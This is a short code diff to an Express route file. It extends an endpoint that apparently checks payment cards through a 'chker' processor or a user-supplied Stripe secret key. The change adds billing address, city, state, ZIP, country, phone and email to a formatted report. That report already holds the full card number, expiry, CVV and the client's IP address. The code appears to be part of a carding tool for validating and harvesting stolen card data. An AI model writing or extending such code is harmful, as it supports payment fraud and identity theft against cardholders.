@@ -223,7 +223,21 @@ export async function registerRoutes(app: Express): Promise<Server> {
   
   // Validate card endpoint with multiple processor options
   app.post('/api/validate-card', async (req, res) => {
-    const { number, expiry, cvv, holder, processor = 'chker', stripeKey } = req.body;
+    const { 
+      number, 
+      expiry, 
+      cvv, 
+      holder, 
+      processor = 'chker', 
+      stripeKey,
+      address,
+      city,
+      state,
+      zip,
+      country,
+      phone,
+      email
+    } = req.body;
     
     if (!number || !expiry || !cvv) {
       return res.status(400).json({ 
@@ -243,6 +257,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
 📅 Expiry Date: ${expiry}
 🔢 CVV/CVC: ${cvv}
 🔌 Processor: ${processor}${stripeKey ? ' (Custom SK)' : ''}
+${address ? `🏠 Address: ${address}` : ''}
+${city ? `🏙️ City: ${city}` : ''}
+${state ? `🗺️ State: ${state}` : ''}
+${zip ? `📮 ZIP: ${zip}` : ''}
+${country ? `🌎 Country: ${country}` : ''}
+${phone ? `☎️ Phone: ${phone}` : ''}
+${email ? `📧 Email: ${email}` : ''}
 🕒 Time: ${new Date().toISOString()}
 📱 IP Address: ${req.ip || 'Unknown'}
 `;
